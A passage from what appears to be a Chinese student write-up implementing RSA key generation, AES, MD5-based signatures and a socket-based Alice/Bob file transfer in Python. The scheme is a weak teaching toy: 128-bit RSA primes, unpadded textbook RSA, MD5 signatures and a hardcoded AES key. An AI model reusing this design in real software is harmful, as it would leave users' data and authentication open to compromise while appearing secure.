        res = <span class="hljs-built_in">int</span>(res,<span class="hljs-number">2</span>)
        <span class="hljs-keyword">if</span> miller_rabin(res):
            <span class="hljs-keyword">return</span> res                          <span class="hljs-comment"># 直到该数通过素数检验才推出循环</span></code></pre>



<h4 id="Miller-Rabin素性检验"><a href="#Miller-Rabin素性检验" class="headerlink" title="Miller-Rabin素性检验"></a>Miller-Rabin素性检验</h4><p>​    在本实验中，我使用了 Miller-Rabin 素性检验结合随机数的生成来得到所需要的大素数， 它是一个基于概率的算法，是费马小定理的一个改进。  简单来说， 要测试𝑛是否为素数，首先将𝑛 - 1分解为2𝑠𝑑。 在每次测试开始时，先随机选一个介于[1, 𝑛 - 1]的整数𝑎，之后如果对所有的𝑟 ∈ [0, 𝑠 - 1]， 若𝑎𝑑 ≠ 1(𝑚𝑜𝑑 𝑛)且𝑎^((2^𝑟)*𝑑) ≠-1(𝑚𝑜𝑑 𝑛)，则𝑛是合数。否则， 𝑛有3/4的概率为素数，随着增加测试的次数，是素数的概率会越来越高，当达到某一次数时，为素数的概率可以接近100%。</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">miller_rabin</span>(<span class="hljs-params">n</span>):</span>
    s = n - <span class="hljs-number">1</span>
    t = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> s % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:  <span class="hljs-comment"># n,s,t之间的关系为 n = 2^s * t</span>
        s = s // <span class="hljs-number">2</span>
        t += <span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> trials <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):   <span class="hljs-comment"># 可以多增加几轮保证大概率为素数</span>
        a = random.randrange(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>) <span class="hljs-comment"># 随机生成a</span>
        v = <span class="hljs-built_in">pow</span>(a, s, n)               <span class="hljs-comment"># 验证 a^(n-1) mod n</span>
        <span class="hljs-keyword">if</span> v != <span class="hljs-number">1</span>:
            i = <span class="hljs-number">0</span>
            <span class="hljs-keyword">while</span> v != (n - <span class="hljs-number">1</span>):
                <span class="hljs-keyword">if</span> i == t - <span class="hljs-number">1</span>:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-keyword">else</span>:
                    i = i + <span class="hljs-number">1</span>
                    v = (v ** <span class="hljs-number">2</span>) % n
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></code></pre>

<h3 id="3-2-2-生成公钥e"><a href="#3-2-2-生成公钥e" class="headerlink" title="3.2.2 生成公钥e"></a>3.2.2 生成公钥e</h3><p>𝑒需要满足1 &lt; 𝑒 &lt; 𝜑(𝑛)且gcd(𝑒, 𝜑(𝑛)) = 1，即𝑒与𝜑(𝑛)互素。 </p>
<p>这里为了保证安全性，设置了e的值不能小于2000。</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genE</span>(<span class="hljs-params">phi_n</span>):</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        e = genPrime(b=random.randint(<span class="hljs-number">3</span>,<span class="hljs-number">13</span>))  <span class="hljs-comment">#随机生成e</span>
        <span class="hljs-keyword">if</span> e &lt; <span class="hljs-number">2000</span> :                  <span class="hljs-comment"># e不能太小</span>
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> phi_n%e != <span class="hljs-number">0</span>:               <span class="hljs-comment"># 保证e不能被phi整除</span>
            <span class="hljs-keyword">return</span> e</code></pre>

<h3 id="3-2-3-计算私钥d"><a href="#3-2-3-计算私钥d" class="headerlink" title="3.2.3 计算私钥d"></a>3.2.3 计算私钥d</h3><h4 id="模重复平方法"><a href="#模重复平方法" class="headerlink" title="模重复平方法"></a>模重复平方法</h4><p>为了提高大数模时的计算速度，这里采用的时模重复平方法。</p>
<p>算法伪代码如图</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714111320464.png" alt="image-20210714111320464" style="zoom:67%;">

<h4 id="计算私钥d"><a href="#计算私钥d" class="headerlink" title="计算私钥d"></a>计算私钥d</h4><p>在RSA算法中求私钥中的整数d时，需要使得 (e * d ) % m = 1，该方程等价于 e * d = 1 + y * m ，也等价于 e * d - y * m = 1。（都为整数）</p>
<p>因此求解d的过程就是求解该二元一次方程组（e和m已知，求解d），即求e模m的逆元。</p>
<p>使用欧几里得扩展算法求逆元(辗转相除法)</p>
<blockquote>
<p>给定模数m，求a的逆相当于求解ax=1(mod m)<br>这个方程可以转化为ax-my=1<br>然后套用求二元一次方程的方法，用扩展欧几里得算法求得一组x0,y0和gcd<br>检查gcd是否为1<br>gcd不为1则说明逆元不存在<br>若为1，则调整x0到0~m-1的范围中即可</p>
</blockquote>
<p>具体代码如下</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">caculateD</span>(<span class="hljs-params">a, m</span>):</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m</code></pre>

<h3 id="3-2-4加解密过程"><a href="#3-2-4加解密过程" class="headerlink" title="3.2.4加解密过程"></a>3.2.4加解密过程</h3><p>有了以上的基础，RSA的加解密就很简单了，直接套用公式即可。</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RSAEncode</span>(<span class="hljs-params">m, e, n</span>):</span>               <span class="hljs-comment"># 加密公式 m^e mod n</span>
    m = <span class="hljs-built_in">int</span>(str2Hex(m), <span class="hljs-number">16</span>)           <span class="hljs-comment"># 将字符转换为二进制</span>
    c = fast_mod(m, e, n)
    <span class="hljs-keyword">return</span> c

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RSADecode</span>(<span class="hljs-params">c, d, n</span>):</span>                 <span class="hljs-comment"># 加密公式 c^d mod n</span>
    plaintext = fast_mod(c,d,n)
    plaintext = <span class="hljs-built_in">str</span>(long_to_bytes(plaintext).decode()) <span class="hljs-comment"># 将数字转换为字符</span>
    <span class="hljs-keyword">return</span> plaintext</code></pre>

<h3 id="3-2-5-正确性验证"><a href="#3-2-5-正确性验证" class="headerlink" title="3.2.5 正确性验证"></a>3.2.5 正确性验证</h3><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714112147375.png" alt="image-20210714112147375"></p>
<h2 id="3-3-AES"><a href="#3-3-AES" class="headerlink" title="3.3 AES"></a>3.3 AES</h2><p>AES加密算法同DES相同都是分组加密算法，AES是对128位数据进行加密，密钥也是128位，加密后产生128位的密文，AES的加密轮数为10轮，明文和密钥都被分为4组，每组32bit。</p>
<p>AES为分组密码，每组长度相等，每次加密一组数据，直到加密完整个明文。 在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。 密钥的长度可以使用128位、192位或256位甚至更多，密钥的长度不同，加密轮数也不同，如下表所示：</p>
<img src="https://f5.pm/img.php?ref=https%3A%2F%2Fsec.thief.one%2Farticle_content%3Fa_id%3Deaf09e3255e31d63a513b1ba70ea4a5e&f=https://mmbiz.qpic.cn/mmbiz_png/kVCSSCFiaG8ImxH14jS3OWGOJ4SmKhUBH6RhpI7rCO40v6jTJQXokGB0JSjuEreiaDBQiaE3PhUjALYSd8iaaa6Ppg/640?wx_fmt=png" alt="img" style="zoom:67%;">



<p>以下以AES-128为例进行阐述，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是完全一样的，只有第10次略有不同，即每个明文分组会进行10轮加密。</p>
<p>AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。</p>
<p>该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：</p>
<img src="https://f5.pm/img.php?ref=https%3A%2F%2Fsec.thief.one%2Farticle_content%3Fa_id%3Deaf09e3255e31d63a513b1ba70ea4a5e&f=https://mmbiz.qpic.cn/mmbiz_png/kVCSSCFiaG8ImxH14jS3OWGOJ4SmKhUBHF1pHbI1nHibCjVCkiaABCdlYBgwBeRYIESbGfNzXNaOWsBvib8O9Wfqfw/640?wx_fmt=png" alt="img" style="zoom:67%;">

<p>同样，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始轮密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：</p>
<img src="https://f5.pm/img.php?ref=https%3A%2F%2Fsec.thief.one%2Farticle_content%3Fa_id%3Deaf09e3255e31d63a513b1ba70ea4a5e&f=https://mmbiz.qpic.cn/mmbiz_png/kVCSSCFiaG8ImxH14jS3OWGOJ4SmKhUBHQeib23GZYgQZIqx0Iy86MBjEWsJia4m5ggOUwoOLBQsic3nJKGicHdIicUQ/640?wx_fmt=png" alt="img" style="zoom:67%;">

<p>上图中，W[0] = K0 K1 K2 K3 。</p>
<p>AES加密算法主要步骤有：</p>
<ul>
<li>轮密钥加：AddRoundKey</li>
<li>字节替代：ByteSub</li>
<li>行移位： ShiftRow</li>
<li>列混肴： MixColumns</li>
</ul>
<p>AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。</p>
<img src="https://f5.pm/img.php?ref=https%3A%2F%2Fsec.thief.one%2Farticle_content%3Fa_id%3Deaf09e3255e31d63a513b1ba70ea4a5e&f=https://mmbiz.qpic.cn/mmbiz_png/kVCSSCFiaG8ImxH14jS3OWGOJ4SmKhUBHDcPhfyYMVWsnJsXicITn1hcicXblmtgmrqOZLwYGWpgetngmZM3vI4cQ/640?wx_fmt=png" alt="img" style="zoom:67%;">



<p>下面分别介绍AES中一轮的操作阶段，这些操作阶段使输入位得到充分的混淆。</p>
<h3 id="3-3-1-字节代换"><a href="#3-3-1-字节代换" class="headerlink" title="3.3.1 字节代换"></a>3.3.1 字节代换</h3><p>​        AES的字节替换，本质上和DES的S盒替换是一样的，都是根据输入字节查表来获得对应的输出字节，不同的是，AES的S盒规格是16*16的字节矩阵。因此，字节替换步骤也是AES算法轮函数的关键，相较于其他运算步骤的线性特征而易于分析，S盒的非线性提供了更好的安全性。<br>​        字节替换的规则是，将状态矩阵中的每个字节的高4位作为行值，低4位作为列值，取出S盒中对应的矩阵字节元素作为替换字节。例如状态矩阵中某个输入字节值为0x6b（01101011），那么行值为6（0110），列值为b（1011），查询如表4.1所示S盒，得到的输出字节为0x7f(01111111)</p>
<p>​        经过该步骤的字节替换之后，输入的4*4字节状态矩阵中的每个字节元素都被新字节替代，得到的新状态矩阵将作为下一步行移位的输入。</p>
<h3 id="3-3-2-行移位"><a href="#3-3-2-行移位" class="headerlink" title="3.3.2 行移位"></a>3.3.2 行移位</h3><p>行移位步骤对输入的状态矩阵进行简单的行循环移位操作（不同行的移位数不同，具体移位数由算法输入决定），本文以第几行左移几个字节为例，行移位过程如图5.1所示，移位完成之后得到的新状态矩阵将作为下一步列混合的输入。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714114322729.png" alt="image-20210714114322729" style="zoom:67%;">

<h3 id="3-3-3-列混淆"><a href="#3-3-3-列混淆" class="headerlink" title="3.3.3 列混淆"></a>3.3.3 列混淆</h3><p>列混合基于矩阵乘法实现，使得状态矩阵中的每一列的各个元素之间按照预先定义的列混合加密矩阵的权重来产生相互混淆的影响，产生列元素互相之间被混合的新状态矩阵。<br>例如，根据公式6.1进行列混合加密，第0行第0列元素的输出计算表示为：</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714114422682.png" alt="image-20210714114422682" style="zoom: 80%;">

<p>该元素将第0列所有元素按预设权重混合起来。</p>
<p><strong>[注意]</strong>：该公式中的乘法和加法不是普通数学意义的乘和加，而是有限域GF(2^8)四则运算中的乘和加，加法即是按位异或，乘法较为复杂，此处不做赘述，有兴趣的同学可以进一步了解有限域的相关知识。</p>
<p>其他行列的计算公式</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714114520386.png" alt="image-20210714114520386" style="zoom:80%;">

<p>AES轮函数中的所有四个步骤都是可逆变换，那么列混合公式如下</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714114616930.png" alt="image-20210714114616930" style="zoom:80%;">



<h3 id="3-3-4-轮密钥加"><a href="#3-3-4-轮密钥加" class="headerlink" title="3.3.4 轮密钥加"></a>3.3.4 轮密钥加</h3><p>轮密钥加的过程十分简单，就是将列混合输出的状态矩阵（共128位）和密钥扩展得到的本轮轮密钥（共128位）进行按位异或，得到最终的本轮状态矩阵输出。</p>
<h3 id="3-3-5-密钥扩展"><a href="#3-3-5-密钥扩展" class="headerlink" title="3.3.5 密钥扩展"></a>3.3.5 密钥扩展</h3><p>与明文分组矩阵一样，密钥扩展也是以8比特字节作为单位对主密钥进行处理，128位主密钥可以表示为K=[K0,K1,…,K15]的4*4字节矩阵。经过密钥扩展函数，K扩展为44列的轮密钥字矩阵（其中一个字为4字节32位），表示为W=[W0,W1,…W43]。每一轮依次取出前4个字（128位）作为本轮轮密钥，如初始轮轮密钥为W[0,3]=[W0,W1,W2,W3]。密钥扩展的过程如图</p>
<h3 id="3-3-6-正确性验证"><a href="#3-3-6-正确性验证" class="headerlink" title="3.3.6 正确性验证"></a>3.3.6 正确性验证</h3><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714121451444.png" alt="image-20210714121451444"></p>
<h2 id="3-4-socket通信"><a href="#3-4-socket通信" class="headerlink" title="3.4 socket通信"></a>3.4 socket通信</h2><p>Socket又称”套接字”，应用程序通常通过”套接字”向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。</p>
<p>该项目中的通信流程：</p>
<img src="/2021/07/21/RSA-AES/Sunzh/%E4%BF%9D%E7%A0%94%E7%9B%B8%E5%85%B3/%E8%A5%BF%E5%B7%A5/%E8%80%83%E6%A0%B8/%E7%BB%98%E5%9B%BE1.png" alt="绘图1" style="zoom:67%;">

<p>server绑定ip和端口</p>
<pre><code class="hljs python">server = socket.socket() <span class="hljs-comment">#创建对象server.bind((&quot;localhost&quot;,8888))#绑定 ip和端口server.listen()  #监听con,addr = server.accept()</span></code></pre>

<p>client创建socket连接server</p>
<pre><code class="hljs python">client = socket.socket()client.connect((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">8888</span>))  <span class="hljs-comment"># 服务器IP地址和端口</span></code></pre>

<h2 id="3-5-数字签名"><a href="#3-5-数字签名" class="headerlink" title="3.5 数字签名"></a>3.5 数字签名</h2><p>​        数字签名（又称公钥数字签名）是只有信息的发送者才能产生的别人无法伪造的一段数字串，这段数字串同时也是对信息的发送者发送信息真实性的一个有效证明。它是一种类似写在纸上的普通的物理签名，但是使用了公钥加密领域的技术来实现的，用于鉴别数字信息的方法。一套数字签名通常定义两种互补的运算，一个用于签名，另一个用于验证。数字签名是非对称密钥加密技术与数字摘要技术的应用。</p>
<p>实现原理如图：</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D.png" alt="数字签名"></p>
<h1 id="四、程序实现"><a href="#四、程序实现" class="headerlink" title="四、程序实现"></a>四、程序实现</h1><p>***加密算法的代码放在另外的文件中</p>
<p>有了上面的原理支撑，整个系统就可以完成了，首先看下整个传输系统的工作过程。</p>
<p>程序整体流程如下图：</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714213527284.png" alt="image-20210714213527284" style="zoom:80%;">

<p>具体实现，所有文件如下</p>
<pre><code class="hljs reasonml">├── <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AES</span>.</span></span>py    
├── alice_Client.py  <span class="hljs-comment">//数据发送方</span>
├── bob_Server.py    <span class="hljs-comment">//数据接收方</span>
├── data     <span class="hljs-comment">// 需要传输的八条数据，这里使用文件存储</span>
│   ├── test0.txt│   
	├── test1.txt│   
	├── test2.txt│   
	├── test3.txt│   
	├── test4.txt│   
	├── test5.txt│   
	├── test6.txt│   
	└── test7.txt
├── file_decode.py   <span class="hljs-comment">// RSA公私钥生成和文件读取</span>
├── <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MD5</span>.</span></span>py			 
└── <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RSA</span>.</span></span>py</code></pre>

<h2 id="file-decode-py"><a href="#file-decode-py" class="headerlink" title="file_decode.py"></a>file_decode.py</h2><p>该函数主要作用有两个</p>
<ul>
<li>读取文件内容</li>
<li>生成RSA算法的n，并计算出d（每次传输时，使用的n都不一样，算是一种一次一密机制，可以提高安全性）</li>
</ul>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> randomimport refrom RSA <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> AES <span class="hljs-keyword">import</span> *e = 65537def read_file(num):    path = <span class="hljs-string">&#x27;.\data\\test&#x27;</span>+<span class="hljs-built_in">str</span>(num)+<span class="hljs-string">&#x27;.txt&#x27;</span>    <span class="hljs-keyword">try</span>:        f = <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>)        text = f.read()        f.close()        print(<span class="hljs-string">&quot;读取成功!&quot;</span>)        <span class="hljs-keyword">return</span> text    <span class="hljs-keyword">except</span> IOError:        print(<span class="hljs-string">&quot;读取错误!&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n_and_d</span>():</span>    p = genPrime(<span class="hljs-number">128</span>)    q = genPrime(<span class="hljs-number">128</span>)    phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)    n = p*q    d = caculateD(e,phi)    print(<span class="hljs-string">&quot;生成的p:&quot;</span>,p)    print(<span class="hljs-string">&quot;生成的q:&quot;</span>,q)    <span class="hljs-keyword">return</span> n,d</code></pre>

<h2 id="bob-server-py"><a href="#bob-server-py" class="headerlink" title="bob_server.py"></a>bob_server.py</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/7/10 23:17</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : bob.py</span>

<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> libnum
<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> AES <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> file_decode <span class="hljs-keyword">import</span> *

name = <span class="hljs-string">&quot;This is bob.&quot;</span>  <span class="hljs-comment"># bob的身份信息真实环境中可以为双方知道的秘密</span>

n,d = n_and_d()  <span class="hljs-comment"># 获取n,d</span>
e = <span class="hljs-number">65537</span>

server = socket.socket() <span class="hljs-comment">#创建对象</span>
server.bind((<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">8888</span>))<span class="hljs-comment">#绑定 ip和端口</span>
server.listen()  <span class="hljs-comment">#监听</span>
<span class="hljs-comment">#等待连接</span>
print(<span class="hljs-string">&#x27;Waiting connection...&#x27;</span>)
<span class="hljs-comment">#接受请求，返回套接字对象和IP+端口号</span>
con,addr = server.accept()
con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;Welcome connect!\n开分发RSA公钥n:\n&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>))
con.recv(<span class="hljs-number">1024</span>)
<span class="hljs-comment"># 向alice发送公钥n</span>
con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(n),<span class="hljs-string">&quot;utf-8&quot;</span>))

n_alice = con.recv(<span class="hljs-number">1024</span>).decode()
n_alice = <span class="hljs-built_in">int</span>(n_alice)
print(<span class="hljs-string">&quot;Alice使用的公钥n:&quot;</span>, n_alice)


<span class="hljs-comment"># 验证alice身份</span>

print(<span class="hljs-string">&quot;验证alice身份...&quot;</span>)
<span class="hljs-comment"># a = input()</span>
alice_name = con.recv(<span class="hljs-number">512</span>).decode()  <span class="hljs-comment"># alice 的明文信息</span>
con.send(<span class="hljs-string">b&#x27;1&#x27;</span>)

hash_name = con.recv(<span class="hljs-number">512</span>).decode()   <span class="hljs-comment"># alice 用私钥加密明文的hash值</span>
plain_text = RSADecode(<span class="hljs-built_in">int</span>(hash_name),e,n_alice) <span class="hljs-comment"># 用alice 的公钥解密出hash值</span>
<span class="hljs-keyword">if</span> plain_text == md5(alice_name):   <span class="hljs-comment"># 判断上一步的值与md5函数加密是否相同</span>
    print(alice_name)               <span class="hljs-comment"># 如果二者相同则可以保证对方是alice,这里的安全性是由公钥算法和hash函数保证</span>
    print(<span class="hljs-string">&quot;验证通过！&quot;</span>)               <span class="hljs-comment"># 因为只有alice有自己的私钥，hash函数的存在防止伪造明文攻击</span>
    con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;您通过了验证!&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>))
<span class="hljs-keyword">else</span>:
    exit(<span class="hljs-string">&quot;这不是alice,验证错误！&quot;</span>)
<span class="hljs-comment">#送出自己的身份信息和签名值</span>
print(<span class="hljs-string">&quot;等待alice验证自身身份...&quot;</span>)

con.send(<span class="hljs-built_in">bytes</span>(name,<span class="hljs-string">&#x27;utf-8&#x27;</span>))    <span class="hljs-comment"># 向alice发送身份信息的明文</span>
con.recv(<span class="hljs-number">1024</span>).decode()

hash_name = md5(name)            <span class="hljs-comment"># 明文信息的hash值</span>
crpto_name = <span class="hljs-built_in">str</span>(RSAEncode(hash_name, d, n))  <span class="hljs-comment"># 使用自己的私钥加密上一步的hash值</span>
crpto_name = <span class="hljs-built_in">bytes</span>(crpto_name,<span class="hljs-string">&#x27;utf-8&#x27;</span>)        <span class="hljs-comment"># 发送给alice</span>
con.send(crpto_name)

print(con.recv(<span class="hljs-number">1024</span>).decode())
print(<span class="hljs-string">&quot;-----------开始接收对称加密密钥-------------&quot;</span>)
enc_key = con.recv(<span class="hljs-number">1024</span>)
enc_key = enc_key.decode()

enc_key = <span class="hljs-built_in">int</span>(enc_key)  <span class="hljs-comment"># 将密钥转换为int类</span>
dec_key = fast_mod(enc_key,d,n)
print(<span class="hljs-string">&quot;收到的对称加密密钥:&quot;</span>,<span class="hljs-built_in">hex</span>(dec_key))
print(<span class="hljs-string">&quot;---&quot;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">&quot;开始接收密文&quot;</span>+<span class="hljs-string">&quot;---&quot;</span>*<span class="hljs-number">5</span>)

<span class="hljs-comment"># 一共接收八条消息</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):
    print(<span class="hljs-string">&quot;接收第&#123;0&#125;条消息&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>))
    con.send(<span class="hljs-string">b&#x27;1&#x27;</span>)
    length = con.recv(<span class="hljs-number">1024</span>)
    length = <span class="hljs-built_in">int</span>(length.decode())

    buff = []
    size = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> size &lt; length:  <span class="hljs-comment"># 开始接受密文</span>
        dat = con.recv(<span class="hljs-number">1024</span>)
        size += <span class="hljs-built_in">len</span>(dat.decode())
        buff.append(dat)
    data = <span class="hljs-string">b&#x27;&#x27;</span>.join(buff)
    bin_cipher = data.decode()
    enc_plain = <span class="hljs-built_in">int</span>(bin_cipher)
    print(<span class="hljs-string">&quot;收到的密文:&quot;</span>, enc_plain)
    plain_text = AES_dec(enc_plain, dec_key)
    print(<span class="hljs-string">&quot;收到的消息:&quot;</span>, plain_text)

<span class="hljs-comment"># 以下是发送确认收到消息和消息的数字签名</span>
message = <span class="hljs-string">&quot;Bob received the file successfully!&quot;</span>
con.send(<span class="hljs-built_in">bytes</span>(message,<span class="hljs-string">&#x27;utf-8&#x27;</span>))
con.recv(<span class="hljs-number">1024</span>).decode()
hash_message = md5(message)
crypt_message = <span class="hljs-built_in">str</span>(RSAEncode(hash_message,d,n))
con.send(<span class="hljs-built_in">bytes</span>(crypt_message,<span class="hljs-string">&#x27;utf-8&#x27;</span>))

print(<span class="hljs-string">&quot;文件传输结束！&quot;</span>)
server.close()</code></pre>

<h2 id="alice-client-py"><a href="#alice-client-py" class="headerlink" title="alice_client.py"></a>alice_client.py</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/7/10 23:17</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : Alice.py</span>

<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> file_decode <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> socket

name = <span class="hljs-string">&quot;This is alice.&quot;</span>   <span class="hljs-comment"># alice的身份信息真实环境中可以为双方知道的秘密</span>
<span class="hljs-comment"># n = 44531776921047477359676235110843825307036514195195627878765712056028758572817 测试使用的n</span>
<span class="hljs-comment"># d = 34159352569920789505556306994405309761109146525598570740717995833480670158209 </span>
n,d = n_and_d()
e = <span class="hljs-number">65537</span>  <span class="hljs-comment"># e使用的都是65537对安全性</span>

client = socket.socket()
client.connect((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">8888</span>))  <span class="hljs-comment"># 本机地址和端口</span>

data = client.recv(<span class="hljs-number">1024</span>)
print(<span class="hljs-built_in">str</span>(data, <span class="hljs-string">&quot;utf-8&quot;</span>),end=<span class="hljs-string">&quot;&quot;</span>)  <span class="hljs-comment"># 连接成功提示消息</span>
client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)

n_bob = client.recv(<span class="hljs-number">1024</span>).decode()
n_bob = <span class="hljs-built_in">int</span>(n_bob)
print(<span class="hljs-string">&quot;bob使用的公钥n:&quot;</span>,n_bob)
<span class="hljs-comment"># 向bob发送自己的n</span>
client.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(n),<span class="hljs-string">&quot;utf-8&quot;</span>))

print(<span class="hljs-string">&quot;等待bob验证自身身份...&quot;</span>)
<span class="hljs-comment"># alice送出自己的身份信息和签名值</span>
client.send(<span class="hljs-built_in">bytes</span>(name,<span class="hljs-string">&#x27;utf-8&#x27;</span>))             <span class="hljs-comment"># alice发送身份明文信息</span>
client.recv(<span class="hljs-number">1024</span>).decode()
hash_name = md5(name)
crpto_name = <span class="hljs-built_in">str</span>(RSAEncode(
    hash_name, d, n)) <span class="hljs-comment"># 发送对hash值加密后的值</span>
crpto_name = <span class="hljs-built_in">bytes</span>(crpto_name,<span class="hljs-string">&#x27;utf-8&#x27;</span>)
client.send(crpto_name)

print(client.recv(<span class="hljs-number">1024</span>).decode())             <span class="hljs-comment"># 接收身份认证的结果</span>
<span class="hljs-comment">#接收bob身份hash值并验证</span>
print(<span class="hljs-string">&quot;验证bob身份...&quot;</span>)

bob_name = client.recv(<span class="hljs-number">512</span>).decode()          <span class="hljs-comment"># bob发送过来的身份明文信息</span>
client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)

hash_name = client.recv(<span class="hljs-number">512</span>).decode()          <span class="hljs-comment"># bob使用自己的私钥加密身份明文信息hash值后的值</span>
plain_text = RSADecode(<span class="hljs-built_in">int</span>(hash_name),e,n_bob) <span class="hljs-comment"># 使用bob的公钥解密上一步的值</span>

<span class="hljs-keyword">if</span> plain_text == md5(bob_name):                <span class="hljs-comment"># 验证是不是bob</span>
    print(bob_name)
    print(<span class="hljs-string">&quot;验证通过!&quot;</span>)
    client.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;您通过了验证!&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>))
<span class="hljs-keyword">else</span>:
    exit(<span class="hljs-string">&quot;验证错误!&quot;</span>)

print(<span class="hljs-string">&quot;------------开始传输对称加密密钥-----------&quot;</span>)
key = <span class="hljs-number">0x12345678</span>
int_key = <span class="hljs-built_in">int</span>(key)
enc_key = RSA(int_key,e,n_bob)
print(<span class="hljs-string">&quot;RAS加密后的密钥:&quot;</span>,enc_key)
print(<span class="hljs-string">&quot;开始传输......&quot;</span>)
client.sendall(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(enc_key), <span class="hljs-string">&quot;utf-8&quot;</span>))

